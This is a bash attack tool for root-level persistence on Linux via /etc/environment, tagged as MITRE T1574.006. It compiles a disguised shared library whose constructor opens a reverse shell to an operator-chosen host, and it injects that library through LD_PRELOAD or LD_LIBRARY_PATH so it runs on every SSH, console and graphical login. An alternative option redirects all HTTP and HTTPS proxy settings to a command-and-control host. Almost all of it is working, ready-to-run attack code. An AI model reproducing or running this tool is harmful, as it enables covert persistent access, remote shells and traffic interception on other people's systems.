#!/bin/bash
# /etc/environment LD_PRELOAD Injection (T1574.006)
# Injects LD_PRELOAD/LD_LIBRARY_PATH into PAM-sourced /etc/environment
# Fires BEFORE any shell profile on every PAM login session

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_enviro"
LIB_NAME="libsyshelper.so.1"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║   /etc/environment LD_PRELOAD Injection (T1574.006)  ║"
    echo " ║  Fires BEFORE shell profiles via PAM pam_env module  ║"
    echo " ║  Affects: SSH, login, su, sudo, gdm, console logins  ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

compile_preload_lib() {
    local LHOST="$1" LPORT="$2" LIBPATH="$3"
    command -v gcc >/dev/null 2>&1 || { echo -e "${RED}[-] gcc not found${NC}"; return 1; }

    TMPDIR=$(mktemp -d)
    cat > "${TMPDIR}/lib.c" << 'CSRC'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <dlfcn.h>

static void __attribute__((constructor)) _init(void) {
    // Only run once via lock file
    if (access("/tmp/.shlock", F_OK) == 0) return;
    FILE *f = fopen("/tmp/.shlock", "w");
    if (f) fclose(f);

    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        int i; for (i = 3; i < 256; i++) close(i);
        execl("/bin/sh", "sh", "-c",
            "PAYLOAD_CMD",
            NULL);
        _exit(0);
    }
}
CSRC

    local PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
    sed -i "s|PAYLOAD_CMD|${PAYLOAD}|g" "${TMPDIR}/lib.c"

    gcc -shared -fPIC -nostartfiles -o "${TMPDIR}/${LIB_NAME}" "${TMPDIR}/lib.c" -ldl 2>&1
    if [ ! -f "${TMPDIR}/${LIB_NAME}" ]; then
        echo -e "${RED}[-] Compilation failed${NC}"
        rm -rf "$TMPDIR"
        return 1
    fi
    cp "${TMPDIR}/${LIB_NAME}" "$LIBPATH"
    chmod 755 "$LIBPATH"
    rm -rf "$TMPDIR"
    echo -e "${GREEN}[+] Library compiled: ${LIBPATH}${NC}"
    return 0
}

install_ld_preload() {
    local LHOST="$1" LPORT="$2"
    local LIBPATH="/usr/local/lib/${LIB_NAME}"

    compile_preload_lib "$LHOST" "$LPORT" "$LIBPATH" || return

    # Update ldconfig cache
    echo "$LIBPATH" >> /etc/ld.so.conf.d/syshelper.conf 2>/dev/null
    ldconfig 2>/dev/null

    # Inject into /etc/environment
    [ -f /etc/environment ] && cp /etc/environment /etc/environment.d3m0n.bak

    # Remove old entry if exists
    grep -q "$MARKER" /etc/environment 2>/dev/null && \
        sed -i "/${MARKER}/d; /LD_PRELOAD.*${LIB_NAME}/d" /etc/environment

    printf '# %s\nLD_PRELOAD=%s\n' "$MARKER" "$LIBPATH" >> /etc/environment

    echo -e "${GREEN}[+] Injected LD_PRELOAD into /etc/environment${NC}"
    echo -e "${YELLOW}[!] Fires on next PAM login (SSH, login, su, sudo, gdm)${NC}"
    echo -e "${YELLOW}[!] Does NOT affect su/sudo when LD_PRELOAD is stripped by PAM${NC}"
    echo -e "${YELLOW}[!] Check /etc/pam.d/ for pam_env.so entries${NC}"
}

install_ld_library_path() {
    # Less suspicious: use LD_LIBRARY_PATH instead
    local LHOST="$1" LPORT="$2"
    local LIBDIR="/usr/local/lib/.${MARKER}/"
    mkdir -p "$LIBDIR"

    compile_preload_lib "$LHOST" "$LPORT" "${LIBDIR}/${LIB_NAME}" || return

    [ -f /etc/environment ] && cp /etc/environment /etc/environment.d3m0n.bak
    grep -q "$MARKER" /etc/environment 2>/dev/null && \
        sed -i "/${MARKER}/d; /LD_LIBRARY_PATH.*${MARKER}/d" /etc/environment

    printf '# %s\nLD_LIBRARY_PATH=%s:$LD_LIBRARY_PATH\n' "$MARKER" "$LIBDIR" >> /etc/environment

    echo -e "${GREEN}[+] Injected LD_LIBRARY_PATH into /etc/environment${NC}"
}

install_proxy_env() {
    # Use http_proxy/https_proxy pointing to C2 — less suspicious than LD_PRELOAD
    local C2_HOST="$1" C2_PORT="$2"
    [ -f /etc/environment ] && cp /etc/environment /etc/environment.d3m0n.bak
    printf '# %s\nhttp_proxy=http://%s:%s/\nhttps_proxy=http://%s:%s/\n' \
        "$MARKER" "$C2_HOST" "$C2_PORT" "$C2_HOST" "$C2_PORT" >> /etc/environment
    echo -e "${GREEN}[+] Proxy env vars injected — all HTTP/HTTPS traffic proxied to ${C2_HOST}:${C2_PORT}${NC}"
}

check_pam_env() {
    echo -e "${YELLOW}[*] pam_env.so entries (determines if /etc/environment is read):${NC}"
    grep -r "pam_env" /etc/pam.d/ 2>/dev/null | grep -v "^#" | while read -r l; do echo "  $l"; done
    echo ""
    echo -e "${YELLOW}[*] Current /etc/environment:${NC}"
    cat /etc/environment 2>/dev/null | while read -r l; do echo "  $l"; done
}

cleanup() {
    echo -e "${YELLOW}[*] Cleaning...${NC}"
    # Restore backup
    if [ -f /etc/environment.d3m0n.bak ]; then
        mv /etc/environment.d3m0n.bak /etc/environment
        echo -e "${GREEN}[+] Restored /etc/environment${NC}"
    else
        grep -q "$MARKER" /etc/environment 2>/dev/null && \
            sed -i "/${MARKER}/d; /LD_PRELOAD.*${LIB_NAME}/d; /LD_LIBRARY_PATH.*${MARKER}/d" /etc/environment
    fi
    rm -f "/usr/local/lib/${LIB_NAME}"
    rm -rf "/usr/local/lib/.${MARKER}/"
    rm -f /etc/ld.so.conf.d/syshelper.conf
    ldconfig 2>/dev/null
    rm -f /tmp/.shlock
    echo -e "${GREEN}[+] Cleaned${NC}"
}

banner
[[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required.${NC}"; exit 1; }

echo -e "  ${YELLOW}[1]${NC} LD_PRELOAD injection (compiled .so)"
echo -e "  ${YELLOW}[2]${NC} LD_LIBRARY_PATH injection"
echo -e "  ${YELLOW}[3]${NC} HTTP proxy injection (C2 traffic interception)"
echo -e "  ${YELLOW}[4]${NC} Check PAM env configuration"
echo -e "  ${YELLOW}[5]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        install_ld_preload "$LHOST" "$LPORT"
        ;;
    2)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        install_ld_library_path "$LHOST" "$LPORT"
        ;;
    3)
        read -rp "C2 Host: " C2H; read -rp "C2 Port [8080]: " C2P; C2P="${C2P:-8080}"
        install_proxy_env "$C2H" "$C2P"
        ;;
    4) check_pam_env ;;
    5) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
